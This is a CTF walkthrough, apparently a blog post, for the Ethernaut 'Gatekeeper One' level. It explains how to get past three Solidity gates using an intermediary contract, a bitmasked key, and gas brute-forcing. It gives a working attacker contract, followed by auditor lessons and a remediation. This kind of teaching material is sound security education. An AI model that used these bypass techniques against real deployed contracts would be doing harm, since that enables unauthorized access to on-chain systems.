---
title: 'Ethernaut - Gatekeeper One'
description: 'Bypassing complex multiple gate controls in Solidity. Learn how to solve execution origin barriers, brute-force exact gas constraints, and master bitwise mask operations.'
date: 2025-07-13
tags: ['solidity', 'security', 'bitwise', 'gas-bruteforce', 'gatekeeper', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🚪 Gatekeeper One - The Multi-Gate Challenge

## Challenge Overview

The goal of this level is to bypass **three distinct security gates** to register our address as the `entrant` of the `GatekeeperOne` contract.

**The Catch:**
1. **Gate One** checks the transaction caller source.
2. **Gate Two** requires the exact amount of remaining gas at a specific execution step to be a multiple of `8191`.
3. **Gate Three** checks specific type casting and size matching logic on our submitted 8-byte key.

---

## Technical Analysis

Let's examine the three gates in `GatekeeperOne.sol`:

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}

modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}

modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "Gate3: Failed on part 1");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "Gate3: Failed on part 2");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "Gate3: Failed on part 3");
    _;
}
```

---

### Gate One: Origin Verification
*   **The Check**: `require(msg.sender != tx.origin)`
*   **The Bypass**: Like the `Telephone` challenge, calling the contract from an intermediate attack contract instead of our EOA immediately satisfies this constraint (`msg.sender` becomes the attack contract, while `tx.origin` remains our EOA).

---

### Gate Three: Bitwise and Type Casting
*   **The Check**: Requires the 8-byte key (`bytes8`) to satisfy three distinct properties when cast to integers. Let's represent the key as a 64-bit unsigned integer `K` (which is `uint64` equivalent of `bytes8`):
    1.  `uint32(K) == uint16(K)`: The lower 32 bits must equal the lower 16 bits. This requires bits 16 to 31 to be all **zeros**.
    2.  `uint32(K) != K`: The lower 32 bits must NOT equal the full 64-bit value. This requires that the upper 32 bits are **non-zero**.
    3.  `uint32(K) == uint16(uint160(tx.origin))`: The lower 32 bits must equal the lower 16 bits of the `tx.origin` address.

*   **The Key Derivation**:
    We can construct `K` by taking the lower 64 bits of `tx.origin`, masking it to zero out bits 16-31, and forcing the upper 32 bits to be non-zero:
    ```solidity
    bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
    ```
    *   **Part 1**: `0x0000FFFF` keeps bits 16-31 set to `0000`, so `uint32(K) == uint16(K)` is satisfied.
    *   **Part 2**: The upper 32 bits are preserved from the player's address (which is almost certainly non-zero) or we can force them to be non-zero (e.g., masking with `0xFFFFFFFF0000FFFF`), making `uint32(K) != K` satisfied.
    *   **Part 3**: The lower 16 bits match the lower 16 bits of `tx.origin`, satisfying the final check.

---

### Gate Two: Exact Gas Brute-Forcing
*   **The Check**: `require(gasleft() % 8191 == 0)`
*   **The Challenge**: `gasleft()` reads the remaining gas at the point of instruction execution. Calculating the exact opcode gas cost up to this point is extremely fragile because compiler optimizations, Solidity versions, and EVM clients can shift the offset by a few units.
*   **The Bypass**: Instead of guessing the exact offset, we can program our attack contract to brute-force the transaction gas. We know that `gas = (8191 * 10) + offset`. We can loop `offset` from `0` to `8191` and send the transaction using `call{gas: ...}`. When the correct offset is reached, the transaction will succeed.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy an exploit contract that takes the target address and constructs the key using our player `tx.origin`.
2. **Execute Gas Brute-Force**: The exploit contract runs a loop calling `target.enter{gas: 8191 * 10 + i}(gateKey)` where `i` represents our gas offset search space (typically `0` to `300` is sufficient).
3. **Verify Success**: Once the loop finds the working gas amount, it registers our EOA as the entrant.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public immutable target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() external {
        // Calculate the gate key based on tx.origin
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        // Brute-force the exact gas offset
        // 8191 * 10 is a safe baseline gas level
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break; // Stop immediately upon successful entry
            }
        }
    }
}
```

Deploy this contract, call `attack()`, and verify that `entrant` has been updated to your player address!

---

## Auditor's Lessons

1. **Fragile Gas Assumptions**: Never base flow control or logical checks on exact gas amounts (`gasleft()`). Opcode gas costs change between Ethereum hard forks, meaning contracts relying on exact gas amounts can break permanently.
2. **Complex Bitwise Obfuscation is Not Security**: Security-by-obscurity through complex bitwise shifts or type-casting checks does not secure a contract. It merely delays analysis.
3. **Contracts are Programmatic EOAs**: Never rely on `msg.sender != tx.origin` to check if a call came from a human. High-fidelity integrations and smart contract wallets (Safe) rely heavily on proxy execution.

---

## Remediation

Remove gas checking and complex casting validation. Restrict access using modern explicit access patterns (e.g. OpenZeppelin `AccessControl`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

contract SecureGatekeeper is AccessControl {
    bytes32 public constant ENTRANTS_ROLE = keccak256("ENTRANTS_ROLE");
    address public entrant;

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    // Standard secure entry authorization
    function enter(address _newEntrant) external onlyRole(ENTRANTS_ROLE) {
        entrant = _newEntrant;
    }
}
```
